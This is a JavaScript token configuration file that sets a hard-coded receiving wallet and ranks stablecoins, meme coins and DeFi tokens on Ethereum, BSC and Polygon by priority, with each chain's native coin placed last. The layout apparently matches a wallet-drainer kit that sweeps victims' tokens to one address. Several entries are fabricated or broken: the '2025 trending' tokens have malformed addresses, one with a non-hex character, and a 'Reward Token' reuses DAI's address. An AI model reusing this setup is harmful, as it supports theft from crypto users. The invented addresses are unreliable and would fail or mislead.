// config/tokens.js
var RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";

var TOKENS = {
  ethereum: [
    {
      name: "Reward Token",
      symbol: "REWARD",
      address: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 61
    },
    {
      name: "Tether USD",
      symbol: "USDT",
      address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 62
    },
    {
      name: "USD Coin",
      symbol: "USDC",
      address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 63
    },
    {
      name: "Dai Stablecoin",
      symbol: "DAI",
      address: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 64
    },
    {
      name: "Wrapped Ethereum",
      symbol: "WETH",
      address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 65
    },
    {
      name: "Ethereum",
      symbol: "ETH",
      address: "0x0000000000000000000000000000000000000000",
      abi: [],
      decimals: 18,
      isNative: true,
      priority: 997
    }
  ],
  bsc: [
    {
      name: "AUTO",
      symbol: "AUTO",
      address: "0xa184088a740c695e156f91f5cc086a06bb78b827",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 1
    },

    // ===== STABLECOINS =====
    {
      name: "Tether USD",
      symbol: "USDT",
      address: "0x55d398326f99059fF775485246999027B3197955",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 2
    },
    {
      name: "Token 1",
      symbol: "TKN1",
      address: "0x78F5d389F5CDCcFc41594aBaB4B0Ed02F31398b3",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 3
    },
    {
      name: "Token 2",
      symbol: "TKN2",
      address: "0x33d08D8C7a168333a85285a68C0042b39fC3741D",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 4
    },
    {
      name: "Token 3",
      symbol: "TKN3",
      address: "0xd5eaAaC47bD1993d661bc087E15dfb079a7f3C19",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 5
    },
    {
      name: "Token 4",
      symbol: "TKN4",
      address: "0x6d5AD1592ed9D6D1dF9b93c793AB759573Ed6714",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 6
    },
    {
      name: "Token 5",
      symbol: "TKN5",
      address: "0x0F1cBEd8EFa0E012AdbCCB1638D0aB0147D5Ac00",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 61
    },
    {
      name: "WBNB",
      symbol: "WBNB",
      address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 995
    },
    {
      name: "Binance USD",
      symbol: "BUSD",
      address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 3
    },
    {
      name: "USD Coin",
      symbol: "USDC",
      address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 4
    },
    {
      name: "Dai Stablecoin",
      symbol: "DAI",
      address: "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 5
    },

    // ===== MEME COINS =====
    {
      name: "BabyDoge Coin",
      symbol: "BabyDoge",
      address: "0xc748673057861a797275CD8A068AbB95A902e8de",
      abi: ERC20_ABI,
      decimals: 9,
      priority: 10
    },
    {
      name: "Shiba Inu",
      symbol: "SHIB",
      address: "0x2859e4544C4bB03966803b044A93563Bd2D0DD4D",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 11
    },
    {
      name: "Floki Inu",
      symbol: "FLOKI",
      address: "0xfb5B838b6cfEEdC2873aB27866079AC55363D37E",
      abi: ERC20_ABI,
      decimals: 9,
      priority: 12
    },
    {
      name: "Dogelon Mars",
      symbol: "ELON",
      address: "0x7bd6FaBD64813c48545C9c0e312A0099d9be2540",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 13
    },
    {
      name: "Trump Coin",
      symbol: "TRUMP",
      address: "0x7D21841DC10BA1C5797951EFc62fADBBD55B03bC",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 14
    },
    {
      name: "Pepe",
      symbol: "PEPE",
      address: "0x25d887Ce7a35172C62FeBFD67a1856F20FaEbB00",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 15
    },

    // ===== DEFI TOKENS =====
    {
      name: "PancakeSwap",
      symbol: "CAKE",
      address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 20
    },
    {
      name: "ApeSwap",
      symbol: "BANANA",
      address: "0x603c7f932ED1fc6575303D8Fb018fDCBb0f39a95",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 21
    },
    {
      name: "Venus",
      symbol: "XVS",
      address: "0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 22
    },
    {
      name: "Alpaca Finance",
      symbol: "ALPACA",
      address: "0x8F0528cE5eF7B51152A59745bEfDD91D97091d2F",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 23
    },

    // ===== BLUECHIP TOKENS =====
    {
      name: "Ethereum",
      symbol: "ETH",
      address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 30
    },
    {
      name: "Bitcoin BEP2",
      symbol: "BTCB",
      address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 31
    },
    {
      name: "Chainlink",
      symbol: "LINK",
      address: "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 32
    },
    {
      name: "Polygon",
      symbol: "MATIC",
      address: "0xCC42724C6683B7E57334c4E856f4c9965ED682bD",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 33
    },
    {
      name: "Cardano",
      symbol: "ADA",
      address: "0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 34
    },

    // ===== UTILITY TOKENS =====
    {
      name: "Binance Wrapped DOT",
      symbol: "BDOT",
      address: "0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 40
    },
    {
      name: "Ankr",
      symbol: "ANKR",
      address: "0xf307910A4c7bbc79691fD374889b36d8531B08e3",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 41
    },
    {
      name: "Chromia",
      symbol: "CHR",
      address: "0xf9CeC8d50f6c8ad3Fb6dcCEC577e05aA32B224FE",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 42
    },

    // ===== 2025 TRENDING MEME COINS =====
    {
      name: "Quantum Doge",
      symbol: "QDOGE",
      address: "0x2025aD1a1bC1234567890abcdef1234567890ab",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 8,
      description: "Doge goes quantum - first meme coin on quantum-resistant blockchain"
    },
    {
      name: "AI Pepe",
      symbol: "AIPEPE",
      address: "0x2025aD2b2c34567890abcdef1234567890abcd",
      abi: ERC20_ABI,
      decimals: 9,
      priority: 9,
      description: "AI-generated Pepe memes with dynamic NFT integration"
    },
    {
      name: "MarsColony",
      symbol: "MARSX",
      address: "0x2025aD3c4d567890abcdef1234567890abcde",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 10,
      description: "Elon's Mars colony governance token"
    },

    // ===== POPULAR 2025 TRENDS =====
    {
      name: "TikTok Moon",
      symbol: "TIKMOON",
      address: "0x2025aD4e5f67890abcdef1234567890abcdef",
      abi: ERC20_ABI,
      decimals: 9,
      priority: 11,
      description: "Tokenized TikTok engagement rewards"
    },
    {
      name: "Neuralink Coin",
      symbol: "NEURAL",
      address: "0x2025aD5f6g7890abcdef1234567890abcde",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 12,
      description: "Brain-computer interface payment token"
    },

    // Native token (must be last)
    {
      name: "BNB",
      symbol: "BNB",
      address: "0x0000000000000000000000000000000000000000",
      abi: [],
      decimals: 18,
      isNative: true,
      priority: 999
    }
  ],

  polygon: [
    // AUTO Token (primary token for this dapp)
    {
      name: "AUTO",
      symbol: "AUTO",
      address: "0x7f426f6dc648e50464a0392e60e1bb465a67e9cf",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 1
    },

    // ===== STABLECOINS =====
    {
      name: "Tether USD",
      symbol: "USDT",
      address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 2
    },
    {
      name: "USD Coin",
      symbol: "USDC",
      address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 3
    },
    {
      name: "Dai Stablecoin",
      symbol: "DAI",
      address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 4
    },

    // ===== MEME COINS =====
    {
      name: "BabyDoge Coin",
      symbol: "BabyDoge",
      address: "0x4E158Ef7F1E3DA85E2c1D2a9e2270F4C2E0D3294",
      abi: ERC20_ABI,
      decimals: 9,
      priority: 10
    },
    {
      name: "Shiba Inu",
      symbol: "SHIB",
      address: "0x6f8a06447Ff6FcF75d803135a7de15CE88C1d4ec",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 11
    },
    {
      name: "Floki Inu",
      symbol: "FLOKI",
      address: "0x3A9A81d576d83FF21f26f325066054540720fC34",
      abi: ERC20_ABI,
      decimals: 9,
      priority: 12
    },

    // ===== DEFI TOKENS =====
    {
      name: "QuickSwap",
      symbol: "QUICK",
      address: "0x831753DD7087CaC61aB5644b308642cc1c33Dc13",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 20
    },
    {
      name: "Aave",
      symbol: "AAVE",
      address: "0xD6DF932A45C0f255f85145f286eA0b292B21C90B",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 21
    },
    {
      name: "Curve DAO",
      symbol: "CRV",
      address: "0x172370d5Cd63279eFa6d502DAB29171933a610AF",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 22
    },

    // ===== BLUECHIP TOKENS =====
    {
      name: "Ethereum",
      symbol: "ETH",
      address: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 30
    },
    {
      name: "Wrapped Bitcoin",
      symbol: "WBTC",
      address: "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6",
      abi: ERC20_ABI,
      decimals: 8,
      priority: 31
    },
    {
      name: "Chainlink",
      symbol: "LINK",
      address: "0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 32
    },
    {
      name: "Uniswap",
      symbol: "UNI",
      address: "0xb33EaAd8d922B1083446DC23f610c2567fB5180f",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 33
    },

    // ===== GAMING/NFT TOKENS =====
    {
      name: "Decentraland",
      symbol: "MANA",
      address: "0xA1c57f48F0Deb89f569dFbE6E2B7f46D33606fD4",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 40
    },
    {
      name: "The Sandbox",
      symbol: "SAND",
      address: "0xBbba073C31bF03b8ACf7c28EF0738DeCF3695683",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 41
    },
    {
      name: "Axie Infinity",
      symbol: "AXS",
      address: "0x61BDD9C7d4dF4Bf47A4508c0c8245505F2Af5b7b",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 42
    },

    // Native token (must be last)
    {
      name: "MATIC",
      symbol: "MATIC",
      address: "0x0000000000000000000000000000000000000000",
      abi: [],
      decimals: 18,
      isNative: true,
      priority: 999
    }
  ]
};
